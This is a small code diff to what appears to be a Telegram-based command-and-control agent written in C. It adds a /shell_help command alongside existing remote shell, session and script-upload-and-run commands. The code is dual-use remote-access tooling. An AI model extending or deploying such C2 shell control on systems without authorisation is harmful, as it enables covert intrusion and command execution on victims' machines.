@@ -232,6 +232,7 @@ typedef enum {
   CMD_SESSION_STOP,
   CMD_SESSION_STATUS,
   CMD_RUNFILE,
+  CMD_SHELL_HELP,
   CMD_HELP
 } c2t_cmd_id_t;
 
@@ -306,6 +307,7 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"sh_stop", CMD_SESSION_STOP}, {"session_stop", CMD_SESSION_STOP}, {"shell_stop", CMD_SESSION_STOP},
   {"sh_status", CMD_SESSION_STATUS}, {"session_status", CMD_SESSION_STATUS}, {"shell_status", CMD_SESSION_STATUS},
   {"runfile", CMD_RUNFILE}, {"execfile", CMD_RUNFILE}, {"runscript", CMD_RUNFILE}, {"exec_file", CMD_RUNFILE}, {"run_file", CMD_RUNFILE}, {"script", CMD_RUNFILE},
+  {"shell_help", CMD_SHELL_HELP}, {"sh_help", CMD_SHELL_HELP}, {"shhelp", CMD_SHELL_HELP}, {"shellhelp", CMD_SHELL_HELP},
   {"help", CMD_HELP}
 };
 
@@ -1700,6 +1702,11 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_SHELL_HELP: {
+    (void)c2t_shell_output_send_help();
+    break;
+  }
+
   case CMD_LOGS: {
     c2t_log_info("listener", "Flushing logs on-demand by /logs command");
     c2t_log_sender_dispatch_now();
@@ -2355,6 +2362,7 @@ static void handle_command(const telegram_incoming_update_t *update,
         "• <code>/sh_start [shell]</code> - Launch interactive session (<code>bash</code>, <code>ps</code>, <code>cmd</code>, <code>py</code>)\n"
         "• <code>/sh_in &lt;input&gt;</code> - Send input to running interactive session\n"
         "• <code>/sh_status</code> / <code>/sh_stop</code> - Check or terminate session\n"
+        "• <code>/shell_help</code> - Display comprehensive shell &amp; session guide\n"
         "• <b>Script Upload:</b> Send any script file (<code>.sh</code>, <code>.bat</code>, <code>.ps1</code>, <code>.py</code>) as document with caption <code>/run</code>\n\n";
     if (h_off + sizeof(shell_sec) - 1 < sizeof(help_msg)) {
       memcpy(help_msg + h_off, shell_sec, sizeof(shell_sec) - 1);
